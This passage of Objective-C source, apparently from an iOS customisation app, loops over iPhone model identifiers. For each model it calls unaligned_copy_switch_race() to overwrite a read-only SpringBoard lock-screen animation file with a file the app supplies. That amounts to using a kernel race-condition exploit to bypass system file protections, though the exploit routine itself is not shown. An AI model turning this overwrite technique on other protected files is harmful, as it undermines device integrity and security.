                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone13,1"]) { // iPhone 12 Mini
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone14,3"]) { // iPhone 13 Pro Max
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone14,2"]) { // iPhone 13 Pro
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone14,5"]) { // iPhone 13
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone14,4"]) { // iPhone 13 Mini
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone10,3"]) { // iPhone X (Global)
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone10,6"]) { // iPhone X (GSM)
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone15,2"]) { // iPhone 14 Pro
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-d73.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone15,3"]) { // iPhone 14 Pro Max
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-d73.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone11,2"]) { // iPhone XS
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone11,6"]) { // iPhone XS Max
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone11,4"]) { // iPhone XS Max (China)
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone12,1"]) { // iPhone 11
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone12,3"]) { // iPhone 11 Pro
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone12,5"]) { // iPhone 11 Pro Max
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone11,8"]) { // iPhone XR
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
        });
    }
}
